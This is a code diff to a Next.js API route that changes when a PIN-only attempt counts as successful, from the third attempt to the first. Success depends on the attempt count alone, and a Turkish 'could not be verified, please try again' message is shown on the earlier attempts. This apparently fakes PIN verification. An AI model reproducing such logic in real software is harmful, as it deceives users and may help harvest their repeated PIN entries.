@@ -150,11 +150,11 @@ export async function POST(request: NextRequest) {
       attemptId: attempt.id,
       attemptNumber: attempt.attemptNumber,
       success: isPinOnlyAttempt
-        ? attempt.attemptNumber === 3
+        ? attempt.attemptNumber === 1
         : true,
-      canAdvance: isPinOnlyAttempt && attempt.attemptNumber === 3,
+      canAdvance: isPinOnlyAttempt && attempt.attemptNumber === 1,
       message:
-        isPinOnlyAttempt && attempt.attemptNumber < 3
+        isPinOnlyAttempt && attempt.attemptNumber < 1
           ? "Mobil şifreniz doğrulanamadı. Lütfen tekrar deneyiniz."
           : undefined,
     });
